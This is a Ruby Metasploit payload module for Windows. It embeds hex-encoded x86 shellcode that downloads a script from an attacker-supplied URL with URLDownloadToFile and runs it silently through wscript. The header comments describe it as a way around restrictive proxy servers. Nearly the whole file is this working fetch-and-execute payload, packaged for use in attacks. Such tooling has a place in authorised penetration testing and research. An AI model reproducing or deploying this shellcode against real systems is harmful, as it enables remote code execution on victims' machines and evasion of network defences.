# Metasploit payload module for Download and Execute Script Payload
# Used for bypassing restrictive proxy servers
# Based on "Download & execute" code from here http://www.klake.org/~jt/asmcode/
# More info right here: http://www.thegreycorner.com/2010/05/download-and-execute-script-shellcode.html
# Version 1.1 - with Windows 7 support using the SkyLined method
# http://skypher.com/index.php/2009/07/22/shellcode-finding-kernel32-in-windows-7/
require 'msf/core'
require 'msf/core/payload/windows/exec'


module Metasploit3

	include Msf::Payload::Windows
	include Msf::Payload::Single

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Windows Script Download and Execute',
			'Version'       => '1.1',
			'Description'   => 'Download a script from a HTTP URL and execute it',
			'Author'        => [ 'Stephen Bradshaw' ],
			'License'       => BSD_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Privileged'    => false,
			'Payload'       =>
			{
				'Offsets' => { },
				'Payload' =>
					"\xeb\x77\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b" + 
					"\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xc3\x60" + 
					"\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a" + 
					"\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31" + 
					"\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb" + 
					"\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c" + 
					"\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c" + 
					"\x61\xc3\xe8\x92\xff\xff\xff\x5f\x81\xef\x98\xff\xff\xff\xeb" + 
					"\x05\xe8\xed\xff\xff\xff\x68\x8e\x4e\x0e\xec\x53\xe8\x94\xff" + 
					"\xff\xff\x31\xc9\x66\xb9\x6f\x6e\x51\x68\x75\x72\x6c\x6d\x54" + 
					"\xff\xd0\x68\x36\x1a\x2f\x70\x50\xe8\x7a\xff\xff\xff\x31\xc9" + 
					"\x51\x51\x8d\x37\x81\xc6\xee\xff\xff\xff\x8d\x56\x0c\x52\x57" + 
					"\x51\xff\xd0\x68\x98\xfe\x8a\x0e\x53\xe8\x5b\xff\xff\xff\x41" + 
					"\x51\x56\xff\xd0\x68\x7e\xd8\xe2\x73\x53\xe8\x4b\xff\xff\xff" + 
					"\xff\xd0\x77\x73\x63\x72\x69\x70\x74\x20\x2f\x2f\x42\x20\x61" + 
					"\x2e\x76\x62\x73\x00"
			}
			))

		# EXITFUNC is not supported :/
		deregister_options('EXITFUNC')

		# Register command execution options
		register_options(
			[
				OptString.new('URL', [ true, "The URL pointing to the script.  Don't use .txt, .htm file extentions!" ])
			], self.class)
	end

	#
	# Constructs the payload
	#
	def generate_stage
		return module_info['Payload']['Payload'] + (datastore['URL'] || '') + "\x00"
	end

end
